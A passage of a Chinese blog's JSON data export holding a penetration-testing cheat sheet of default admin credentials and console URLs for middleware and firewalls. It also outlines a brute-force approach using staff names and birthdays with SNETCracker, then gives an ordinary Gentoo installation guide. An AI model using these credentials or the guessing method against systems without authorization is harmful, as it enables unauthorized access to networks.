\n<td>test／123456</td>\n<td></td>\n</tr>\n</tbody></table>\n<h1 id=\"2-实战思路\"><a href=\"#2-实战思路\" class=\"headerlink\" title=\"2 实战思路\"></a>2 实战思路</h1><ul>\n<li>授权项目</li>\n</ul>\n<ol>\n<li>ip地址</li>\n<li>踩点获得人员姓名及生日</li>\n</ol>\n<h2 id=\"2-1-字典生成\"><a href=\"#2-1-字典生成\" class=\"headerlink\" title=\"2.1 字典生成\"></a>2.1 字典生成</h2><ul>\n<li>人员姓名大小写加生日的弱口令</li>\n<li>常规弱口令</li>\n</ul>\n<h2 id=\"2-2-批量爆破工具\"><a href=\"#2-2-批量爆破工具\" class=\"headerlink\" title=\"2.2 批量爆破工具\"></a>2.2 批量爆破工具</h2><ul>\n<li>SNETCracker</li>\n</ul>\n","site":{"data":{}},"wordcount":1672,"more":"<ul>\n<li><a href=\"#1-%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4\">1 默认弱口令</a><ul>\n<li><a href=\"#11-web%E5%AE%B9%E5%99%A8%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4\">1.1 web容器后台弱口令</a></li>\n<li><a href=\"#12-%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%BC%B1%E5%8F%A3%E4%BB%A4\">1.2 安全设备弱口令</a></li>\n</ul>\n</li>\n<li><a href=\"#2-%E5%AE%9E%E6%88%98%E6%80%9D%E8%B7%AF\">2 实战思路</a><ul>\n<li><a href=\"#21-%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90\">2.1 字典生成</a></li>\n<li><a href=\"#22-%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7\">2.2 批量爆破工具</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-默认弱口令\"><a href=\"#1-默认弱口令\" class=\"headerlink\" title=\"1 默认弱口令\"></a>1 默认弱口令</h1><h2 id=\"1-1-web容器后台弱口令\"><a href=\"#1-1-web容器后台弱口令\" class=\"headerlink\" title=\"1.1 web容器后台弱口令\"></a>1.1 web容器后台弱口令</h2><table>\n<thead>\n<tr>\n<th>常见中间件</th>\n<th>管理端口</th>\n<th>后台地址</th>\n<th>默认账号名密码</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Jboss</td>\n<td>8080</td>\n<td><a href=\"http://ip:8080/web-console/\">http://ip:8080/web-console/</a></br><a href=\"http://ip:8080/jmx-console/\">http://ip:8080/jmx-console/</a></br><a href=\"http://ip:8080/console\">http://ip:8080/console</a></td>\n<td>admin&#x2F;admin</td>\n</tr>\n<tr>\n<td>WebSphere</td>\n<td>9060(控制台端口)</br>9043</br>9080</br>9443</br>2809</br>5060</br>5061</br>8880</br>9401</br>9403</br>9402</br>9100</br>9353</br>7276</br>7286</br>5558</br>5578</td>\n<td><a href=\"http://ip:9060/ibm/console/\">http://ip:9060/ibm/console/</a></td>\n<td>默认没有鉴权页面</td>\n</tr>\n<tr>\n<td>Weblogic</td>\n<td>7001(http管理控制端口)</br>7002(https管理控制端口)</td>\n<td><a href=\"http://ip:7001/console\">http://ip:7001/console</a></td>\n<td>weblogic&#x2F;weblogic1</br>weblogic&#x2F;weblogic</br>system&#x2F;system</br>portaladmin&#x2F;portaladmin</br>guest&#x2F;guest</td>\n</tr>\n<tr>\n<td>Tomcat</td>\n<td>8080</td>\n<td><a href=\"http://ip:8080/manager/html\">http://ip:8080/manager/html</a></td>\n<td>tomcat&#x2F;tomcat</br>both&#x2F;tomcat</br>role1&#x2F;tomcat</br>manager&#x2F;admin</td>\n</tr>\n</tbody></table>\n<h2 id=\"1-2-安全设备弱口令\"><a href=\"#1-2-安全设备弱口令\" class=\"headerlink\" title=\"1.2 安全设备弱口令\"></a>1.2 安全设备弱口令</h2><table>\n<thead>\n<tr>\n<th>产品</th>\n<th>登录地址</th>\n<th>默认账号名密码</th>\n<th>技术支持热线</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>天融信防火墙</td>\n<td><a href=\"https://192.168.1.254/\">https://192.168.1.254</a></br><a href=\"https://192.168.1.254:8080/\">https://192.168.1.254:8080</a></td>\n<td>superman&#x2F;talent</br>superman&#x2F;talent!23</td>\n<td>8008105119</td>\n</tr>\n<tr>\n<td>联想网御防火墙(需要证书)</td>\n<td><a href=\"https://10.1.5.254:8889/\">https://10.1.5.254:8889</a></td>\n<td>admin&#x2F;leadsec@7766</br>admin&#x2F;administrator</br>admin&#x2F;bane@7766</td>\n<td>4008107766</br>1056632666</td>\n</tr>\n<tr>\n<td>深信服防火墙</td>\n<td><a href=\"https://10.251.251.251/\">https://10.251.251.251</a></br><a href=\"https://10.254.254.254/\">https://10.254.254.254</a></td>\n<td>admin&#x2F;admin</td>\n<td>4006306430</td>\n</tr>\n<tr>\n<td>启明星辰</td>\n<td><a href=\"https://10.1.5.254:8889/\">https://10.1.5.254:8889</a></br><a href=\"https://10.50.10.45:8889/\">https://10.50.10.45:8889</a></td>\n<td>admin&#x2F;bane＠7766</br>admin&#x2F;admin＠123</td>\n<td>10.50.10.44&#x2F;255.255.255.0</br>技术支持热线:4006243900</td>\n</tr>\n<tr>\n<td>juniper</td>\n<td><a href=\"https://192.168.1.1/\">https://192.168.1.1</a></td>\n<td>netscreen&#x2F;netscreen</td>\n<td></td>\n</tr>\n<tr>\n<td>Cisco</td>\n<td><a href=\"https://192.168.0.1/\">https://192.168.0.1</a></td>\n<td>admin&#x2F;cisco</td>\n<td></td>\n</tr>\n<tr>\n<td>Huawei</td>\n<td><a href=\"http://192.168.0.1/\">http://192.168.0.1</a></td>\n<td>admin&#x2F;Admin＠123</td>\n<td></td>\n</tr>\n<tr>\n<td>H3C</td>\n<td><a href=\"http://192.168.0.1/\">http://192.168.0.1</a></td>\n<td>admin&#x2F;admin</td>\n<td>4006306430</td>\n</tr>\n<tr>\n<td>绿盟IPS</td>\n<td><a href=\"https://192.168.1.101/\">https://192.168.1.101</a></td>\n<td>weboper&#x2F;weboper</td>\n<td>配置重启生效</td>\n</tr>\n<tr>\n<td>网神防火墙GE1口</td>\n<td><a href=\"https://10.50.10.45/\">https://10.50.10.45</a></td>\n<td>admin&#x2F;firewall</td>\n<td>4006108220</td>\n</tr>\n<tr>\n<td>深信服VPN</td>\n<td>51111端口</td>\n<td>delanrecover</td>\n<td></td>\n</tr>\n<tr>\n<td>华为VPN</td>\n<td></td>\n<td>root&#x2F;mduadmin</td>\n<td></td>\n</tr>\n<tr>\n<td>华为防火墙</td>\n<td></td>\n<td>admin&#x2F;Admin＠123</br>eudemon&#x2F;eudemon</td>\n<td></td>\n</tr>\n<tr>\n<td>Juniper防火墙</td>\n<td></td>\n<td>netscreen&#x2F;netscreen</td>\n<td></td>\n</tr>\n<tr>\n<td>迪普</td>\n<td>192.168.0.1</td>\n<td>admin／admin＿default</td>\n<td></td>\n</tr>\n<tr>\n<td>山石</td>\n<td>192.168.1.1</td>\n<td>hillstone&#x2F;hillstone</td>\n<td></td>\n</tr>\n<tr>\n<td>安恒的明御防火墙</td>\n<td></td>\n<td>admin／adminadmin</td>\n<td></td>\n</tr>\n<tr>\n<td>某堡垒机</td>\n<td></td>\n<td>shterm／shterm</td>\n<td></td>\n</tr>\n<tr>\n<td>天融信的vpn</td>\n<td></td>\n<td>test／123456</td>\n<td></td>\n</tr>\n</tbody></table>\n<h1 id=\"2-实战思路\"><a href=\"#2-实战思路\" class=\"headerlink\" title=\"2 实战思路\"></a>2 实战思路</h1><ul>\n<li>授权项目</li>\n</ul>\n<ol>\n<li>ip地址</li>\n<li>踩点获得人员姓名及生日</li>\n</ol>\n<h2 id=\"2-1-字典生成\"><a href=\"#2-1-字典生成\" class=\"headerlink\" title=\"2.1 字典生成\"></a>2.1 字典生成</h2><ul>\n<li>人员姓名大小写加生日的弱口令</li>\n<li>常规弱口令</li>\n</ul>\n<h2 id=\"2-2-批量爆破工具\"><a href=\"#2-2-批量爆破工具\" class=\"headerlink\" title=\"2.2 批量爆破工具\"></a>2.2 批量爆破工具</h2><ul>\n<li>SNETCracker</li>\n</ul>\n"},{"title":"Gentoo 配置手册","excerpt":"gentoo 安装配置记录……","index_img":"/img/article-head/gentoo.jpeg","date":"2022-07-04T02:46:25.000Z","updated":"2022-07-20T01:46:25.000Z","hide":false,"_content":"- [1 准备工作](#1-准备工作)\n  - [1.1 下载](#11-下载)\n  - [1.2 网络](#12-网络)\n  - [1.3 分区挂载](#13-分区挂载)\n  - [1.4 ssh连接最小化安装系统](#14-ssh连接最小化安装系统)\n- [2 安装](#2-安装)\n  - [2.1 解压基本系统](#21-解压基本系统)\n  - [2.2 镜像源与chroot](#22-镜像源与chroot)\n  - [2.3 portage仓库](#23-portage仓库)\n  - [2.4 profile选择](#24-profile选择)\n  - [2.5 安装内核、固件](#25-安装内核固件)\n  - [2.6 配置引导](#26-配置引导)\n  - [2.7 时区、字符集配置](#27-时区字符集配置)\n  - [2.8 virtualbox 虚拟机配置](#28-virtualbox-虚拟机配置)\n- [3 USE](#3-use)\n  - [3.1 make.conf](#31-makeconf)\n  - [3.2 USE](#32-use)\n- [4 tools](#4-tools)\n  - [4.1 包管理](#41-包管理)\n    - [4.1.1 app-portage/eix](#411-app-portageeix)\n  - [4.2 文件系统](#42-文件系统)\n    - [4.2.1 sys-fs/lvm2](#421-sys-fslvm2)\n    - [4.2.2 ntfs](#422-ntfs)\n  - [4.3 DE](#43-de)\n    - [4.3.1 gnome](#431-gnome)\n  - [4.4 vitual](#44-vitual)\n    - [4.4.1 virtualbox](#441-virtualbox)\n    - [4.4.2 kvm](#442-kvm)\n- [5 系统迁移](#5-系统迁移)\n  - [5.1 权限备份与恢复](#51-权限备份与恢复)\n  - [5.2 用户组](#52-用户组)\n# 1 准备工作\n## 1.1 下载\n- 下载[最小化安装镜像](https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/current-install-amd64-minimal/), 名称为: `install-amd64-minimal-{日期}.iso`  \n\n- 下载[合适的stage3](https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/),以日期为路径: `20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz`\n## 1.2 网络\n&emsp;&emsp;基操忽略\n## 1.3 分区挂载\n&emsp;&emsp;基操忽略\n## 1.4 ssh连接最小化安装系统\n&emsp;&emsp;编辑 `sshd` 服务配置文件 `/etc/ssh/sshd_config`, 重启服务 `rc-server sshd restart`\n```bash\nPermitRootLogin yes\nPasswordAuthentication yes\n```\n# 2 安装\n## 2.1 解压基本系统\n```bash\nlivecd ~ # blkid\n/dev/sdb: UUID=\"e09609d8-0b90-4f34-aad1-8e5b37495f52\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\"\n/dev/sr0: BLOCK_SIZE=\"2048\" UUID=\"2022-07-03-19-01-40-00\" LABEL=\"Gentoo amd64 20220703T170542Z\" TYPE=\"iso9660\" PTUUID=\"5e426e6b\" PTTYPE=\"dos\"\nloop0: TYPE=\"squashfs\"\n/dev/sda2: UUID=\"14077ead-3683-4354-95eb-a106c52350e9\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\" PARTUUID=\"4af31142-0ead-0644-b34c-c01b7c0944e1\"\n/dev/sda1: UUID=\"831A-6EDD\" BLOCK_SIZE=\"512\" TYPE=\"vfat\" PARTUUID=\"733a54ad-b3d7-3842-8cc8-21b15d29e82d\"\nlivecd ~ # mount /dev/sda2 /mnt/gentoo/\nlivecd ~ # mkdir /mnt/gentoo/boot\nlivecd ~ # mount /dev/sda1 /mnt/gentoo/boot\nlivecd ~ # cd /mnt/gentoo/\nlivecd /mnt/gentoo # ls\nboot  lost+found\nlivecd /mnt/gentoo # wget https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz\n--2022-07-05 08:09:54--  https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz  \nResolving mirrors.bfsu.edu.cn... 39.155.141.16, 2001:da8:20f:1003::fe55:2840\nConnecting to mirrors.bfsu.edu.cn|39.155.141.16|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 516402028 (492M) [application/octet-stream]\nSaving to: ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’\nstage3-amd64-desktop-systemd- 100%[=================================================>] 492.48M  11.3MB/s    in 46s\n2022-07-05 08:10:40 (10.6 MB/s) - ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’ saved [516402028/516402028]\nlivecd /mnt/gentoo # tar xpvf stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz --xattrs-include='*.*' --numeric-owner\n……\n```\n## 2.2 镜像源与chroot\n&emsp;&emsp;配置一个速度较快的镜像源服务器地址\n```bash\nmirrorselect -i -o >>/mnt/gentoo/etc/portage/make.conf  # 选择163和清华大学源\necho 'GENTOO_MIRRORS=\"https://mirrors.tuna.tsinghua.edu.cn/gentoo\"' >>/mnt/gentoo/etc/portage/make.conf\n# chroot 到目标系统\n# 复制 DNS 配置到目标系统环境\ncp -L /etc/resolv.conf /mnt/gentoo/etc/\n# 挂载必要的文件系统\nmount --types proc /proc /mnt/gentoo/proc\nmount --rbind /sys /mnt/gentoo/sys\nmount --rbind /dev /mnt/gentoo/dev\n# systemd stage3 额外执行\nmount --make-rslave /mnt/gentoo/sys\nmount --make-rslave /mnt/gentoo/dev\n# chroot 到目标系统环境\nchroot /mnt/gentoo\n# 导入环境信息\n. /etc/profile\n# 修改提示符以便于区分\nPS1=(chroot)$PS1\n```\n\n## 2.3 portage仓库\n\n```bash\n# 仓库信息打包下载到本地\nemerge-webrsync\n# 安装 vim\nemerge -ask app-editors/vim\n```\n\n## 2.4 profile选择\n\n```bash\n(chroot)livecd / # eselect profile list\n(chroot)livecd / # eselect profile set 7\n(chroot)livecd / # emerge --ask --verbose --update --deep --newuse @world\n```\n\n## 2.5 安装内核、固件\n\n```bash\n(chroot)livecd / # emerge --ask gentoo-kernel  \n```\n\n```bash\n(chroot)livecd / # emerge --ask linux-firmware\n\n```\n\n## 2.6 配置引导\n\n```bash\n(chroot)livecd / # emerge --ask grub\n(chroot)livecd / # grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo\nInstalling for x86_64-efi platform.\nInstallation finished. No error reported.\n(chroot)livecd / # grub-install --target=x86_64-efi --efi-directory=/boot --removable\nInstalling for x86_64-efi platform.\nInstallation finished. No error reported.  \n(chroot)livecd / # grub-mkconfig -o /boot/grub/grub.cfg\nGenerating grub configuration file ...\nFound linux image: /boot/vmlinuz-5.15.48-gentoo-dist\nFound initrd image: /boot/initramfs-5.15.48-gentoo-dist.img\nWarning: os-prober will not be executed to detect other bootable partitions.\nSystems on them will not be added to the GRUB boot configuration.\nCheck GRUB_DISABLE_OS_PROBER documentation entry.\nAdding boot menu entry for UEFI Firmware Settings ...\ndone        \n```\n\n## 2.7 时区、字符集配置\n\n```bash\necho 'Asia/Shanghai' > /etc/timezone\nrm /etc/localtime\nemerge --config sys-libs/timezone-data\nvim /etc/locale.gen\nlocale-gen\n\ndd if=/dev/zero of=/swapfile bs=1M count=8192 status=progress\nchmod 600 /swapfile\nmkswap /swapfile\nswapon /swapfile\necho \"/swapfile               none    swap    defaults        0 0\" >> /etc/fstab\n```\n\n## 2.8 virtualbox 虚拟机配置\n\n```bash\n# 新建用户\nuseradd -m -g wheel -G usb,users,audio -s /bin/bash -N miloo\n\n# 如果是虚拟机需要添加到以下两个组\ngpasswd -a miloo vboxguest\ngpasswd -a miloo vboxsf\n\n# virtualbox 虚拟机安装后操作\nemerge --ask app-emulation/virtualbox-guest-additions\nsystemctl enable --now virtualbox-guest-additions\n```\n\n# 3 USE\n\n## 3.1 make.conf\n\n```bash\n# These settings were set by the catalyst build script that automatically\n# built this stage.\n# Please consult /usr/share/portage/config/make.conf.example for a more\n# detailed example.\nCOMMON_FLAGS=\"-march=native -O2 -pipe\"\nCFLAGS=\"${COMMON_FLAGS}\"\nCXXFLAGS=\"${COMMON_FLAGS}\"\nFCFLAGS=\"${COMMON_FLAGS}\"\nFFLAGS=\"${COMMON_FLAGS}\"\nMAKEOPTS=\"-j25\"\n\n# NOTE: This stage was built with the bindist Use flag enabled\nPORTDIR=\"/var/db/repos/gentoo\"\nDISTDIR=\"/var/cache/distfiles\"\nPKGDIR=\"/var/cache/binpkgs\"\n\n# This sets the language of build output to English.\n# Please keep this setting intact when reporting bugs.\nLC_MESSAGES=C\n\n# mirrors\nGENTOO_MIRRORS=\"https://mirrors.ustc.edu.cn/gentoo/\"\nACCEPT_LICENSE=\"*\"\nACCEPT_KEYWORDS=\"amd64\"\nAUTO_CLEAN=\"yes\"\n\n# aria\nFETCHCOMMAND=\"/usr/bin/aria2c -d \\${DISTDIR} -o \\${FILE} --allow-overwrite=true --max-tries=5 --max-file-not-found=2 --max-concurrent-downloads=5 --connect-timeout=5 --timeout=5 --split=5 --min-split-size=2M --lowest-speed-limit=20K --max-connection-per-server=9 --uri-selector=feedback \\${URI}\"\nRESUMECOMMAND=\"${FETCHCOMMAND}\"\n\n# ccache\nFEATURES=\"ccache -test\"\nCCACHE_DIR=\"/var/cache/ccache\"\n\n# GRUB\nGRUB_PLATFORMS=\"efi-64\"\n\n# CPUS\nABI_X86=\"64\"\nCPU_FLAGS_X86=\"aes avx avx2 f16c fma3 mmx mmxext pclmul popcnt rdrand sha sse sse2 sse3 sse4_1 sse4_2 sse4a ssse3\"\n\n# cards\nVIDEO_CARDS=\"amdgpu radeonsi\"\n\n# touchpad\n#INPUT_DEVICES=\"libinput synaptics\"  ##设置后触摸板配置失效\n\n# language\nL10N=\"en-US zh-CN en zh\"\nLINGUAS=\"en-US zh-CN en zh\"\n\n# USE\n\nSYSME=\"-test -doc systemd\"\nGNOME=\"-kde -games -help -extras X gtk gnome\"\nUSE=\"${SYSME} ${GNOME} \"\n```\n\n## 3.2 USE\n\n个人 `USE` 使用说明：\n- `/etc/portage/make.conf` 仅添加必要 `flag` 且尽量仅添加排除项。\n```bash\nSYSME=\"-test -doc systemd\"\nGNOME=\"-kde -games -help -extras X gtk gnome\"\nUSE=\"${SYSME} ${GNOME} \"\n```\n- `/etc/portage/package.accept_keywords` 文件夹中创建文件，添加需要开启 `~amd`(测试) 属性的包\n```bash\napp-office/wps-office ~*\n```\n-  `/etc/portage/package.use` 文件夹中创建文件，添加与 `/etc/portage/make.conf` 中 `USE` 相悖或者仅对该包生效的 `flag`\n```bash\napp-emulation/qemu spice QEMU_SOFTMMU_TARGETS: x86_64 QEMU_USER_TARGETS: x86_64\nnet-dns/dnsmasq script\nnet-misc/spice-gtk usbredir\n```\n\n# 4 tools\n\n## 4.1 包管理\n\n### 4.1.1 app-portage/eix\n\n```bash\napp-portage/eix\napp-portage/gentoolkit\napp-portage/layman\n```\n\n## 4.2 文件系统\n\n### 4.2.1 sys-fs/lvm2\n\n```bash\nsys-fs/lvm2\n```\n\n### 4.2.2 ntfs\n\n```bash\nsys-fs/ntfs3g\n```\n\n## 4.3 DE\n\n### 4.3.1 gnome \n\n> 一定要有swap分区，否则编译不会通过  \n> make。conf 中 MAKEOPTS=\"-j4\" 此条不存在编译也会失败\n\n```bash\ngnome-base/gnome\ngnome-base/gconf\ngnome-extra/gnome-tweaks\n```\n\n## 4.4 vitual\n\n### 4.4.1 virtualbox\n\n```bash\napp-emulation/virtualbox\napp-emulation/virtualbox-additions\napp-emulation/virtualbox-extpack-oracle\napp-emulation/virtualbox-modules\napp-emulation/virtualbox-guest-additions  # gentoo虚拟机安装\n```\n\n### 4.4.2 kvm\n\n```bash\napp-emulation/qemu\napp-emulation/libvirt\napp-emulation/virt-manager\nnet-misc/bridge-utils\n```\n\n```bash\nusermod -a -G libvirt miloo\nusermod -a -G kvm miloo \nsystemctl enable libvirtd\nsystemctl enable virtlogd-admin.socket\n```\n\n\n# 5 系统迁移\n\n## 5.1 权限备份与恢复\n\n```bash\ngetfacl -R ./ > acl.txt\nsetfacl --restore=acl.txt\n```\n\n## 5.2 用户组\n\n```\n用户id=1001(miloo) 组id=100(users) 组=100(users),10(wheel),11(floppy),18(audio),19(cdrom),27(video),85(usb),78(kvm),272(plugdev),172(pulse-access),304(vboxusers),79(libvirt)\n```\n","source":"_posts/2022-07-04.gentoo配置手册.md","raw":"---\ntitle: Gentoo 配置手册\nexcerpt: gentoo 安装配置记录……\nindex_img: /img/article-head/gentoo.jpeg\ndate: \"2022/7/4 10:46:25\"\nupdated: \"2022/7/20 9:46:25\"\nhide: false\ntags:\n- Linux\n- Gentoo\ncategories:\n- Linux\n- Gentoo\n---\n- [1 准备工作](#1-准备工作)\n  - [1.1 下载](#11-下载)\n  - [1.2 网络](#12-网络)\n  - [1.3 分区挂载](#13-分区挂载)\n  - [1.4 ssh连接最小化安装系统](#14-ssh连接最小化安装系统)\n- [2 安装](#2-安装)\n  - [2.1 解压基本系统](#21-解压基本系统)\n  - [2.2 镜像源与chroot](#22-镜像源与chroot)\n  - [2.3 portage仓库](#23-portage仓库)\n  - [2.4 profile选择](#24-profile选择)\n  - [2.5 安装内核、固件](#25-安装内核固件)\n  - [2.6 配置引导](#26-配置引导)\n  - [2.7 时区、字符集配置](#27-时区字符集配置)\n  - [2.8 virtualbox 虚拟机配置](#28-virtualbox-虚拟机配置)\n- [3 USE](#3-use)\n  - [3.1 make.conf](#31-makeconf)\n  - [3.2 USE](#32-use)\n- [4 tools](#4-tools)\n  - [4.1 包管理](#41-包管理)\n    - [4.1.1 app-portage/eix](#411-app-portageeix)\n  - [4.2 文件系统](#42-文件系统)\n    - [4.2.1 sys-fs/lvm2](#421-sys-fslvm2)\n    - [4.2.2 ntfs](#422-ntfs)\n  - [4.3 DE](#43-de)\n    - [4.3.1 gnome](#431-gnome)\n  - [4.4 vitual](#44-vitual)\n    - [4.4.1 virtualbox](#441-virtualbox)\n    - [4.4.2 kvm](#442-kvm)\n- [5 系统迁移](#5-系统迁移)\n  - [5.1 权限备份与恢复](#51-权限备份与恢复)\n  - [5.2 用户组](#52-用户组)\n# 1 准备工作\n## 1.1 下载\n- 下载[最小化安装镜像](https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/current-install-amd64-minimal/), 名称为: `install-amd64-minimal-{日期}.iso`  \n\n- 下载[合适的stage3](https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/),以日期为路径: `20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz`\n## 1.2 网络\n&emsp;&emsp;基操忽略\n## 1.3 分区挂载\n&emsp;&emsp;基操忽略\n## 1.4 ssh连接最小化安装系统\n&emsp;&emsp;编辑 `sshd` 服务配置文件 `/etc/ssh/sshd_config`, 重启服务 `rc-server sshd restart`\n```bash\nPermitRootLogin yes\nPasswordAuthentication yes\n```\n# 2 安装\n## 2.1 解压基本系统\n```bash\nlivecd ~ # blkid\n/dev/sdb: UUID=\"e09609d8-0b90-4f34-aad1-8e5b37495f52\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\"\n/dev/sr0: BLOCK_SIZE=\"2048\" UUID=\"2022-07-03-19-01-40-00\" LABEL=\"Gentoo amd64 20220703T170542Z\" TYPE=\"iso9660\" PTUUID=\"5e426e6b\" PTTYPE=\"dos\"\nloop0: TYPE=\"squashfs\"\n/dev/sda2: UUID=\"14077ead-3683-4354-95eb-a106c52350e9\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\" PARTUUID=\"4af31142-0ead-0644-b34c-c01b7c0944e1\"\n/dev/sda1: UUID=\"831A-6EDD\" BLOCK_SIZE=\"512\" TYPE=\"vfat\" PARTUUID=\"733a54ad-b3d7-3842-8cc8-21b15d29e82d\"\nlivecd ~ # mount /dev/sda2 /mnt/gentoo/\nlivecd ~ # mkdir /mnt/gentoo/boot\nlivecd ~ # mount /dev/sda1 /mnt/gentoo/boot\nlivecd ~ # cd /mnt/gentoo/\nlivecd /mnt/gentoo # ls\nboot  lost+found\nlivecd /mnt/gentoo # wget https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz\n--2022-07-05 08:09:54--  https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz  \nResolving mirrors.bfsu.edu.cn... 39.155.141.16, 2001:da8:20f:1003::fe55:2840\nConnecting to mirrors.bfsu.edu.cn|39.155.141.16|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 516402028 (492M) [application/octet-stream]\nSaving to: ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’\nstage3-amd64-desktop-systemd- 100%[=================================================>] 492.48M  11.3MB/s    in 46s\n2022-07-05 08:10:40 (10.6 MB/s) - ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’ saved [516402028/516402028]\nlivecd /mnt/gentoo # tar xpvf stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz --xattrs-include='*.*' --numeric-owner\n……\n```\n## 2.2 镜像源与chroot\n&emsp;&emsp;配置一个速度较快的镜像源服务器地址\n```bash\nmirrorselect -i -o >>/mnt/gentoo/etc/portage/make.conf  # 选择163和清华大学源\necho 'GENTOO_MIRRORS=\"https://mirrors.tuna.tsinghua.edu.cn/gentoo\"' >>/mnt/gentoo/etc/portage/make.conf\n# chroot 到目标系统\n# 复制 DNS 配置到目标系统环境\ncp -L /etc/resolv.conf /mnt/gentoo/etc/\n# 挂载必要的文件系统\nmount --types proc /proc /mnt/gentoo/proc\nmount --rbind /sys /mnt/gentoo/sys\nmount --rbind /dev /mnt/gentoo/dev\n# systemd stage3 额外执行\nmount --make-rslave /mnt/gentoo/sys\nmount --make-rslave /mnt/gentoo/dev\n# chroot 到目标系统环境\nchroot /mnt/gentoo\n# 导入环境信息\n. /etc/profile\n# 修改提示符以便于区分\nPS1=(chroot)$PS1\n```\n\n## 2.3 portage仓库\n\n```bash\n# 仓库信息打包下载到本地\nemerge-webrsync\n# 安装 vim\nemerge -ask app-editors/vim\n```\n\n## 2.4 profile选择\n\n```bash\n(chroot)livecd / # eselect profile list\n(chroot)livecd / # eselect profile set 7\n(chroot)livecd / # emerge --ask --verbose --update --deep --newuse @world\n```\n\n## 2.5 安装内核、固件\n\n```bash\n(chroot)livecd / # emerge --ask gentoo-kernel  \n```\n\n```bash\n(chroot)livecd / # emerge --ask linux-firmware\n\n```\n\n## 2.6 配置引导\n\n```bash\n(chroot)livecd / # emerge --ask grub\n(chroot)livecd / # grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo\nInstalling for x86_64-efi platform.\nInstallation finished. No error reported.\n(chroot)livecd / # grub-install --target=x86_64-efi --efi-directory=/boot --removable\nInstalling for x86_64-efi platform.\nInstallation finished. No error reported.  \n(chroot)livecd / # grub-mkconfig -o /boot/grub/grub.cfg\nGenerating grub configuration file ...\nFound linux image: /boot/vmlinuz-5.15.48-gentoo-dist\nFound initrd image: /boot/initramfs-5.15.48-gentoo-dist.img\nWarning: os-prober will not be executed to detect other bootable partitions.\nSystems on them will not be added to the GRUB boot configuration.\nCheck GRUB_DISABLE_OS_PROBER documentation entry.\nAdding boot menu entry for UEFI Firmware Settings ...\ndone        \n```\n\n## 2.7 时区、字符集配置\n\n```bash\necho 'Asia/Shanghai' > /etc/timezone\nrm /etc/localtime\nemerge --config sys-libs/timezone-data\nvim /etc/locale.gen\nlocale-gen\n\ndd if=/dev/zero of=/swapfile bs=1M count=8192 status=progress\nchmod 600 /swapfile\nmkswap /swapfile\nswapon /swapfile\necho \"/swapfile               none    swap    defaults        0 0\" >> /etc/fstab\n```\n\n## 2.8 virtualbox 虚拟机配置\n\n```bash\n# 新建用户\nuseradd -m -g wheel -G usb,users,audio -s /bin/bash -N miloo\n\n# 如果是虚拟机需要添加到以下两个组\ngpasswd -a miloo vboxguest\ngpasswd -a miloo vboxsf\n\n# virtualbox 虚拟机安装后操作\nemerge --ask app-emulation/virtualbox-guest-additions\nsystemctl enable --now virtualbox-guest-additions\n```\n\n# 3 USE\n\n## 3.1 make.conf\n\n```bash\n# These settings were set by the catalyst build script that automatically\n# built this stage.\n# Please consult /usr/share/portage/config/make.conf.example for a more\n# detailed example.\nCOMMON_FLAGS=\"-march=native -O2 -pipe\"\nCFLAGS=\"${COMMON_FLAGS}\"\nCXXFLAGS=\"${COMMON_FLAGS}\"\nFCFLAGS=\"${COMMON_FLAGS}\"\nFFLAGS=\"${COMMON_FLAGS}\"\nMAKEOPTS=\"-j25\"\n\n# NOTE: This stage was built with the bindist Use flag enabled\nPORTDIR=\"/var/db/repos/gentoo\"\nDISTDIR=\"/var/cache/distfiles\"\nPKGDIR=\"/var/cache/binpkgs\"\n\n# This sets the language of build output to English.\n# Please keep this setting intact when reporting bugs.\nLC_MESSAGES=C\n\n# mirrors\nGENTOO_MIRRORS=\"https://mirrors.ustc.edu.cn/gentoo/\"\nACCEPT_LICENSE=\"*\"\nACCEPT_KEYWORDS=\"amd64\"\nAUTO_CLEAN=\"yes\"\n\n# aria\nFETCHCOMMAND=\"/usr/bin/aria2c -d \\${DISTDIR} -o \\${FILE} --allow-overwrite=true --max-tries=5 --max-file-not-found=2 --max-concurrent-downloads=5 --connect-timeout=5 --timeout=5 --split=5 --min-split-size=2M --lowest-speed-limit=20K --max-connection-per-server=9 --uri-selector=feedback \\${URI}\"\nRESUMECOMMAND=\"${FETCHCOMMAND}\"\n\n# ccache\nFEATURES=\"ccache -test\"\nCCACHE_DIR=\"/var/cache/ccache\"\n\n# 